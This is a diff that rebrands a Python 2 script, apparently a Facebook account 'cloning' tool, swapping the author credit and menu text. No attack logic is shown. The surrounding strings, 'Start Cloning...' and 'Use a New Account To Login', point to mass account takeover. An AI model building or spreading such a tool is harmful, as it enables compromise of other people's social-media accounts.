@@ -91,7 +91,7 @@ while (loop == 'true'):
     if (username == CorrectUsername):
     	password = raw_input("\033[1;97mEnter Passcode \x1b[1;97m: \x1b[1;97m")
         if (password == CorrectPassword):
-            print "\033[1;97mAccess Granted "#Dev:Jam_Shahrukh
+            print "\033[1;97mAccess Granted "#Dev:ABDUL_BASIT
 	    time.sleep(1)
             loop = 'false'
         else:
@@ -111,7 +111,7 @@ def login():
      	
 		
 		jalan(' \033[1;97m   ✧ \033[1;97mWarning: \033[1;97mUse a New Account To Login' )
-		jalan(' \033[1;97m   ✧ \033[1;97m👉 : \033[1;97mJam King Of Facebook' ) 
+		jalan(' \033[1;97m   ✧ \033[1;97m👉 : \033[1;97mABDUL BASIT KAMBOH KING OF THE FACEBOOK' ) 
 		
 		print('	' )
 		print('      \033[1;97m      ✧ \x1b[1;97mLogin With Facebook\x1b[1;97m ✧')
@@ -197,7 +197,7 @@ def menu():
 	print "\033[1;97m✧\033[1;97m.\033[1;97m1.\x1b[1;97m Start Cloning..."
       
         
-        print "\033[1;97m✧\033[1;97m.\033[1;97m2.\033[1;97m Follow Me On YouTube For Help"
+        print "\033[1;97m✧\033[1;97m.\033[1;97m2.\033[1;97m Follow Me On World For Help"
         print "\033[1;97m✧\033[1;97m.\033[1;97m0.\033[1;97m Logout            "
         hop()
 
